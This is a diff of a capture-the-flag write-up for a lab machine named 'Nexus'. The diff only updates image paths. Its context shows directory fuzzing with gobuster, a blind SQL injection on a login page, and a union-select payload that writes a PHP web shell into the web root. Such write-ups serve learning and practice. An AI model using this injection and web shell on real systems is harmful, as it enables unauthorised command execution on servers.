@@ -69,11 +69,11 @@ Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
 
 At the web page we get this creppy stuff. So for now what we can do is fuzz and add the domain that nmap reported us in _/etc/hosts_
 
-![](Máquina%20Nexus.png)
+![](/assets/img/Anexos/Máquina%20Nexus.png)
 
 What we can do now is start fuzzing for directories and files
 
-![](Máquina%20Nexus-1.png)
+![](/assets/img/Anexos/Máquina%20Nexus-1.png)
 
 ```shell
 ❯ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.14 -x php,html,txt
@@ -101,17 +101,17 @@ Starting gobuster in directory enumeration mode
 
 We see a _index2.php_ and we see this beauty page where I find a login page
 
-![](Máquina%20Nexus-2.png)
+![](/assets/img/Anexos/Máquina%20Nexus-2.png)
 
-![](Máquina%20Nexus-3.png)
+![](/assets/img/Anexos/Máquina%20Nexus-3.png)
 
 ## Explotation 
 
 Trying in this web page it is vulnerable to SQLI (blind)
 
-![](Máquina%20Nexus-4.png)
+![](/assets/img/Anexos/Máquina%20Nexus-4.png)
 
-![](Máquina%20Nexus-5.png)
+![](/assets/img/Anexos/Máquina%20Nexus-5.png)
 
 I decided to get a shell since the target is Linux and is using php: 
 
@@ -119,9 +119,9 @@ I decided to get a shell since the target is Linux and is using php:
 test' union select 1,2,"<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/cmd.php" -- -
 ```
 
-![](Máquina%20Nexus-6.png)
+![](/assets/img/Anexos/Máquina%20Nexus-6.png)
 
-![](Máquina%20Nexus-7.png)
+![](/assets/img/Anexos/Máquina%20Nexus-7.png)
 
 ## Privilage escalation
 
